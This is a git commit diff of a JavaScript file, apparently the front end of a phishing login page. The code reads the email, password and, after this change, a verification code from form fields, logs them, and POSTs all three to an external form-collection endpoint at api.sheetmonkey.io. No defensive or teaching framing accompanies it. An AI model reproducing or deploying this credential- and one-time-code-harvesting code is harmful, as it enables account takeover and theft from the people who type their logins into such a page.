694262c840c999930a75314ca339e700e022618d
JanilsonVaz <160428219+DiscordSport@users.noreply.github.com>
2024-08-29 13:43:20 -0100

    update my project because, i edit more part

--- script_codigo.js
+++ script_codigo.js
@@ -1,27 +1,34 @@
-const submit=(event)=>{
+var apanh=document.getElementById('apanha').addEventListener('click',function(){
+    
+    document.getElementById('outro').addEventListener('submit',function(event){
+        event.preventDefault()
+    })
 
-    event.preventDefault()
     var n1=document.getElementById('inome')
     var nome=n1.value
+
     var s1=document.getElementById('isenha')
     var senhas=s1.value
+
     console.log(nome,senhas)
+
     n1.style.border='solid 1px red'
     s1.style.border='solid 1px red'
 
+    var codigo=document.getElementById('iveri')
+    var cd=codigo.value
+    codigo.style.border='solid 1px red'
+
+    
     fetch('https://api.sheetmonkey.io/form/aMg4Fau8yyiKVsRUqCSS8N',{
         method:'post',
         headers:{
             'Accept':'application/json',
             'Content-Type':'application/json',
         },
-        body:JSON.stringify({email:nome,senha:senhas})
+        body:JSON.stringify({email:nome,senha:senhas,codigo:cd})
     })
-    if(nome.length>4 && senhas.length>7){
+})
 
-        var capa=document.getElementById('capa').style.display='none'
-        var veri=document.getElementById('verifica').style.display='block'
-    }
-}
 
-document.querySelector('form').addEventListener('submit',submit)
+
